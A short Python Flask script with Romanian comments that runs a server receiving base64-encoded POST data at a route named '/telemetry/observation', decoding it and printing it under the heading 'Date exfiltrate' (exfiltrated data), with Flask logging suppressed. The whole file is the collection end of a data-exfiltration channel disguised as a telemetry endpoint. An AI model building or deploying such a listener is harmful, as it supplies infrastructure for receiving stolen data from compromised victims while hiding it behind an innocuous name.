from flask import Flask, request
import base64
import logging

# Dezactivăm log-urile inutile de Flask pentru un look "clean" în terminal
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

app = Flask(__name__)

@app.route('/telemetry/observation', methods=['POST'])
def receive():
    data = request.json.get('data')
    if data:
        decoded = base64.b64decode(data).decode('utf-8')
        print(f"\033[94m[PULS RECEIVIED]\033[0m Date exfiltrate:\n{decoded}\n")
    return {"status": "ok"}

def start_server(port):
    app.run(host='0.0.0.0', port=port)